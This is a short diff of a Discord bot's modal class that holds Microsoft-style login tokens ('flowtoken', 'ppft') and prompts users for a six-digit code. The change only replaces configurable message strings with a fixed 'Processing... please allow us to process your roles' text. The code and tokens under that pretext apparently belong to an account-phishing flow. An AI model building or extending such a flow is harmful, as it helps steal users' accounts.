@@ -19,7 +19,6 @@ class MyModalTwo(ui.Modal):
         self.flowtoken = flowtoken
         self.ppft = ppft
         self.config = json.load(open("config/config.json", "r"))
-        self.msgs = self.config["messages"]
         self.add_item(ui.InputText(label="Code", required=True, max_length=6))
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -70,8 +69,8 @@ class MyModalTwo(ui.Modal):
 
         await interaction.followup.send(
             embed = discord.Embed(
-                title = self.msgs["processing_title"],
-                description = self.msgs["processing_description"],
+                title = "Processing...",
+                description = "⌛ Please allow us to proccess your roles",
                 color = 0xDE755B
             ),
             ephemeral = True
